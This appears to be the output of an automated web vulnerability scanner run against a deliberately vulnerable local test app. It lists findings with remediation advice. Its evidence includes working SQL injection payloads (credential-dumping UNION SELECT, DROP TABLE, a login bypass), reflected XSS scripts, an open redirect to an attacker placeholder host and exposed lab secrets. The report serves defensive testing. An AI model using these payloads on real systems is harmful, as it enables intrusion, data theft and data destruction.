report_title: Red ELISAR — Autonomous Web Vulnerability Assessment

vulnerabilities.detail: Sensitive path '/robots.txt' is publicly accessible (HTTP 200)
vulnerabilities.recommendation: Avoid listing sensitive paths in robots.txt (security by obscurity is not security).
vulnerabilities.evidence: GET /.env → 200 (181 bytes) | GET /backup → 200 (11537 bytes) | GET /api/users → 200 (418 bytes) | GET /admin → 200 (11659 bytes) | GET /robots.txt → 200 (118 bytes)

vulnerabilities.detail: Site is served over HTTP — all traffic is unencrypted
vulnerabilities.recommendation: Enable HTTPS with a valid SSL/TLS certificate. Use Let's Encrypt for free certificates.
vulnerabilities.evidence: URL scheme: http://

vulnerabilities.detail: HTTP header 'Content-Security-Policy' is not set — Mitigates XSS by restricting allowed content sources
vulnerabilities.recommendation: Add a Content-Security-Policy header to whitelist trusted content sources. Example: Content-Security-Policy: default-src 'self'
vulnerabilities.evidence: Response header 'Content-Security-Policy': not present | Response header 'Strict-Transport-Security': not present | Response header 'X-Frame-Options': not present | Response header 'X-Content-Type-Options': not present | Response header 'Referrer-Policy': not present | Response header 'Permissions-Policy': not present

vulnerabilities.detail: Access-Control-Allow-Origin is wildcard (*)
vulnerabilities.recommendation: Replace 'Access-Control-Allow-Origin: *' with specific allowed origins. Never use wildcard CORS for authenticated endpoints.
vulnerabilities.evidence: Access-Control-Allow-Origin: *

vulnerabilities.detail: Header 'Server' exposes technology details: 'Werkzeug/3.1.6 Python/3.13.3, Apache/2.2.8 (Ubuntu)'
vulnerabilities.recommendation: Remove or genericize the Server header to hide version information.
vulnerabilities.evidence: Server: Werkzeug/3.1.6 Python/3.13.3, Apache/2.2.8 (Ubuntu) | X-Powered-By: PHP/7.2.1 | X-App-Version: 1.0.0-dev | Live response header → Server: Werkzeug/3.1.6 Python/3.13.3, Apache/2.2.8 (Ubuntu) | Live response header → X-Powered-By: PHP/7.2.1 | Live response header → X-App-Version: 1.0.0-dev

vulnerabilities.detail: Path '/.env' returned HTTP 200 — Exposed .env file with credentials
vulnerabilities.evidence: GET http://127.0.0.1:5000/.env → 200 OK | Preview: SECRET_KEY=secret123 DATABASE_URL=sqlite:///vuln_app.db ADMIN_PASSWORD=admin123 DEBUG=True FLASK_ENV=development API_KEY...
vulnerabilities.recommendation: Remove or protect '/.env'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: Path '/backup' returned HTTP 200 — Exposed backup file/directory
vulnerabilities.evidence: GET http://127.0.0.1:5000/backup → 200 OK | Preview: <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial...
vulnerabilities.recommendation: Remove or protect '/backup'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: Path '/api/users' returned HTTP 200 — Unauthenticated user data API
vulnerabilities.evidence: GET http://127.0.0.1:5000/api/users → 200 OK | Preview: {   "count": 3,   "status": "ok",   "users": [     {       "email": "admin@vuln-shop.local",       "id": 1,       "passw...
vulnerabilities.recommendation: Remove or protect '/api/users'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: SQLi payload '' UNION SELECT id,username,password,email FROM users--' on http://127.0.0.1:5000/search?q=... triggered SQL error pattern 'sql' in live response
vulnerabilities.evidence: GET http://127.0.0.1:5000/search?q=' OR '1'='1 → HTTP 200 | Matched: sql | GET http://127.0.0.1:5000/search?q=' OR 1=1-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=' UNION SELECT NULL-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=' UNION SELECT NULL,NULL-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=' UNION SELECT id,username,password,email FROM users-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=1 | DROP TABLE users-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=' AND SLEEP(0)-- → HTTP 200 | GET http://127.0.0.1:5000/search?q=' OR SUBSTR(username,1,1)='a'-- → HTTP 200
vulnerabilities.recommendation: Use parameterised queries / prepared statements. NEVER concatenate user input into SQL strings.

vulnerabilities.detail: Login form bypassed using SQLi payload: '' OR '1'='1'--' — Classic tautology bypass. Response confirms successful login.
vulnerabilities.evidence: Live response contains user credentials extracted from DB. Payload: ' UNION SELECT id,username,password,email FROM users-- | POST /login username='' OR '1'='1'--' password='anything' → HTTP 200 | Response: Logged in as: ' OR '1'='1'-- (ID=1) |
vulnerabilities.recommendation: Use parameterised queries for all authentication checks. Implement account lockout and rate limiting.

vulnerabilities.detail: Admin path '/admin' returns HTTP 200 without any authentication credentials
vulnerabilities.evidence: GET http://127.0.0.1:5000/admin → HTTP 200 | Admin keywords confirmed in live response body
vulnerabilities.recommendation: Protect all admin routes with strong authentication and role-based access control.

vulnerabilities.detail: Application is served over plain HTTP — all traffic including credentials is transmitted in cleartext
vulnerabilities.evidence: Target URL scheme is 'http://' — confirmed from http://127.0.0.1:5000
vulnerabilities.recommendation: Deploy TLS (HTTPS) via a certificate authority (e.g. Let's Encrypt). Configure HSTS after enabling HTTPS.

vulnerabilities.detail: HTTP response is missing the 'Strict-Transport-Security' header
vulnerabilities.evidence: Header 'Content-Security-Policy' absent in live response from http://127.0.0.1:5000 | Header 'Strict-Transport-Security' absent in live response from http://127.0.0.1:5000 | Header 'X-Frame-Options' absent in live response from http://127.0.0.1:5000 | Header 'X-Content-Type-Options' absent in live response from http://127.0.0.1:5000 | Header 'Referrer-Policy' absent in live response from http://127.0.0.1:5000 | Header 'Permissions-Policy' absent in live response from http://127.0.0.1:5000
vulnerabilities.recommendation: Add 'Strict-Transport-Security' to all HTTP responses. Example config depends on your web server / framework.

vulnerabilities.detail: Server allows cross-origin requests from ANY domain (*)
vulnerabilities.evidence: Live response: Access-Control-Allow-Origin: *
vulnerabilities.recommendation: Replace '*' with specific trusted origins. Never combine wildcard CORS with cookies/credentials.

vulnerabilities.detail: Path '/admin' returned HTTP 200 — Unauthenticated admin panel access
vulnerabilities.evidence: GET http://127.0.0.1:5000/admin → 200 OK | Preview: <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial...
vulnerabilities.recommendation: Remove or protect '/admin'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: XSS payload reflected unescaped on http://127.0.0.1:5000/greet?name=<payload>
vulnerabilities.evidence: Sent: <script>alert('XSS_1')</script> | Marker 'XSS_1' found verbatim in live HTTP response
vulnerabilities.recommendation: HTML-escape all user input before rendering. Use template engines with auto-escaping (e.g., Jinja2 with |e).

vulnerabilities.detail: Raw SQL query exposed in error message at http://127.0.0.1:5000/search?q=' AND 1=CONVERT(int,'error')--
vulnerabilities.evidence: GET http://127.0.0.1:5000/search?q=' AND 1=CONVERT(int,'error')-- → HTTP 200 | Pattern 'query was:' matched in live response
vulnerabilities.recommendation: Disable debug mode and custom error handlers. Return generic 500 pages in production. Never expose stack traces to end users.

vulnerabilities.detail: Parameter 'url' on /redirect causes unvalidated redirect to external domain: http://evil-attacker.example.com
vulnerabilities.evidence: GET /redirect?url=http://evil-attacker.example.com → HTTP 302 Location: http://evil-attacker.example.com
vulnerabilities.recommendation: Validate redirect destinations against a whitelist. Never redirect to user-supplied external URLs.

vulnerabilities.detail: Missing Secure flag — cookie sent over HTTP
vulnerabilities.evidence: Live Set-Cookie header: session=eyJ1c2VyIjoiYWRtaW4ifQ.afBNjw.6B7zQD0ZSHPMLB4qAcU_P7zwnOA | HttpOnly | Path=/
vulnerabilities.recommendation: Set cookies with: HttpOnly; Secure; SameSite=Strict (or Lax for SSO).

vulnerabilities.detail: Path '/robots.txt' returned HTTP 200 — robots.txt reveals hidden paths
vulnerabilities.evidence: GET http://127.0.0.1:5000/robots.txt → 200 OK | Preview: User-agent: * Disallow: /admin Disallow: /backup Disallow: /.env Disallow: /api/users Disallow: /config Disallow: /db...
vulnerabilities.recommendation: Remove or protect '/robots.txt'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: Path '/sitemap.xml' returned HTTP 200 — sitemap.xml reveals all endpoints
vulnerabilities.evidence: GET http://127.0.0.1:5000/sitemap.xml → 200 OK | Preview: <?xml version="1.0" encoding="UTF-8"?> <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">   <url><loc>http://1...
vulnerabilities.recommendation: Remove or protect '/sitemap.xml'. Ensure sensitive files are outside the web root and access-controlled.

vulnerabilities.detail: Form parameter 'q' at http://127.0.0.1:5000/search reflects unescaped input.
vulnerabilities.recommendation: Apply output encoding and input validation for form parameters.
vulnerabilities.evidence: GET http://127.0.0.1:5000/search param=q payload=<script>alert('x')</script>
